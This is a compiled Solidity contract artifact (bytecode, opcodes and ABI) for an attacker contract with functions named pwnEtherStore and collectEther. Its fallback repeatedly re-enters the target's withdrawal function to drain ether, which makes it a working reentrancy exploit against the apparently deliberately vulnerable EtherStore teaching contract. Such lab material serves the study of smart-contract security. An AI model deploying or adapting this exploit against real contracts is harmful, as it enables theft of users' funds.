{
	"data": {
		"bytecode": {
			"linkReferences": {},
			"object": "608060405234801561001057600080fd5b506040516106df3803806106df8339818101604052810190610032919061008d565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600081519050610087816100f1565b92915050565b6000602082840312156100a3576100a26100ec565b5b60006100b184828501610078565b91505092915050565b60006100c5826100cc565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600080fd5b6100fa816100ba565b811461010557600080fd5b50565b6105c8806101176000396000f3fe6080604052600436106100385760003560e01c80636289d38514610116578063acd2e6e514610120578063ff11e1db1461014b57610039565b5b670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163111156101145760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663155dd5ee670de0b6b3a76400006040518263ffffffff1660e01b81526004016100e19190610462565b600060405180830381600087803b1580156100fb57600080fd5b505af115801561010f573d6000803e3d6000fd5b505050505b005b61011e610162565b005b34801561012c57600080fd5b50610135610351565b6040516101429190610447565b60405180910390f35b34801561015757600080fd5b50610160610375565b005b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16670de0b6b3a76400006040516024016040516020818303038152906040527fe2c41dbc000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516102359190610430565b60006040518083038185875af1925050503d8060008114610272576040519150601f19603f3d011682016040523d82523d6000602084013e610277565b606091505b50509050806102bb576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016102b29061047d565b60405180910390fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663155dd5ee670de0b6b3a76400006040518263ffffffff1660e01b815260040161031c9190610462565b600060405180830381600087803b15801561033657600080fd5b505af115801561034a573d6000803e3d6000fd5b5050505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b3373ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156103bb573d6000803e3d6000fd5b50565b60006103c98261049d565b6103d381856104a8565b93506103e3818560208601610536565b80840191505092915050565b6103f8816104ee565b82525050565b61040781610500565b82525050565b600061041a600e836104b3565b915061042582610569565b602082019050919050565b600061043c82846103be565b915081905092915050565b600060208201905061045c60008301846103ef565b92915050565b600060208201905061047760008301846103fe565b92915050565b600060208201905081810360008301526104968161040d565b9050919050565b600081519050919050565b600081905092915050565b600082825260208201905092915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006104f982610512565b9050919050565b600061050b826104e4565b9050919050565b600061051d82610524565b9050919050565b600061052f826104c4565b9050919050565b60005b83811015610554578082015181840152602081019050610539565b83811115610563576000848401525b50505050565b7f4465706f736974206661696c656400000000000000000000000000000000000060008201525056fea2646970667358221220fdf31ac17fd9d62f09da259160436620fd81ca0deae2237a0ebd49f293c3079364736f6c63430008070033",
			"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x6DF CODESIZE SUB DUP1 PUSH2 0x6DF DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0x8D JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x108 JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x87 DUP2 PUSH2 0xF1 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xA3 JUMPI PUSH2 0xA2 PUSH2 0xEC JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0xB1 DUP5 DUP3 DUP6 ADD PUSH2 0x78 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xC5 DUP3 PUSH2 0xCC JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xFA DUP2 PUSH2 0xBA JUMP JUMPDEST DUP2 EQ PUSH2 0x105 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x5C8 DUP1 PUSH2 0x117 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x38 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6289D385 EQ PUSH2 0x116 JUMPI DUP1 PUSH4 0xACD2E6E5 EQ PUSH2 0x120 JUMPI DUP1 PUSH4 0xFF11E1DB EQ PUSH2 0x14B JUMPI PUSH2 0x39 JUMP JUMPDEST JUMPDEST PUSH8 0xDE0B6B3A7640000 PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE GT ISZERO PUSH2 0x114 JUMPI PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x155DD5EE PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xE1 SWAP2 SWAP1 PUSH2 0x462 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xFB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x10F JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST PUSH2 0x11E PUSH2 0x162 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x12C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x135 PUSH2 0x351 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x142 SWAP2 SWAP1 PUSH2 0x447 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x157 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x160 PUSH2 0x375 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0xE2C41DBC00000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD PUSH2 0x235 SWAP2 SWAP1 PUSH2 0x430 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x272 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x277 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x2BB JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x2B2 SWAP1 PUSH2 0x47D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x155DD5EE PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x31C SWAP2 SWAP1 PUSH2 0x462 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x336 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x34A JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x3BB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3C9 DUP3 PUSH2 0x49D JUMP JUMPDEST PUSH2 0x3D3 DUP2 DUP6 PUSH2 0x4A8 JUMP JUMPDEST SWAP4 POP PUSH2 0x3E3 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x536 JUMP JUMPDEST DUP1 DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x3F8 DUP2 PUSH2 0x4EE JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x407 DUP2 PUSH2 0x500 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x41A PUSH1 0xE DUP4 PUSH2 0x4B3 JUMP JUMPDEST SWAP2 POP PUSH2 0x425 DUP3 PUSH2 0x569 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x43C DUP3 DUP5 PUSH2 0x3BE JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x45C PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x3EF JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x477 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x3FE JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x496 DUP2 PUSH2 0x40D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x4F9 DUP3 PUSH2 0x512 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x50B DUP3 PUSH2 0x4E4 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x51D DUP3 PUSH2 0x524 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x52F DUP3 PUSH2 0x4C4 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x554 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x539 JUMP JUMPDEST DUP4 DUP2 GT ISZERO PUSH2 0x563 JUMPI PUSH1 0x0 DUP5 DUP5 ADD MSTORE JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH32 0x4465706F736974206661696C6564000000000000000000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 REVERT RETURN BYTE 0xC1 PUSH32 0xD9D62F09DA259160436620FD81CA0DEAE2237A0EBD49F293C3079364736F6C63 NUMBER STOP ADDMOD SMOD STOP CALLER "
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "296000",
				"executionCost": "infinite",
				"totalCost": "infinite"
			},
			"external": {
				"": "infinite",
				"collectEther()": "infinite",
				"etherStore()": "2597",
				"pwnEtherStore()": "infinite"
			}
		},
		"methodIdentifiers": {
			"collectEther()": "ff11e1db",
			"etherStore()": "acd2e6e5",
			"pwnEtherStore()": "6289d385"
		}
	},
	"abi": [
		{
			"inputs": [
				{
					"internalType": "address",
					"name": "_etherStoreAddress",
					"type": "address"
				}
			],
			"stateMutability": "nonpayable",
			"type": "constructor"
		},
		{
			"stateMutability": "payable",
			"type": "fallback"
		},
		{
			"inputs": [],
			"name": "collectEther",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "etherStore",
			"outputs": [
				{
					"internalType": "contract EtherStore",
					"name": "",
					"type": "address"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "pwnEtherStore",
			"outputs": [],
			"stateMutability": "payable",
			"type": "function"
		}
	]
}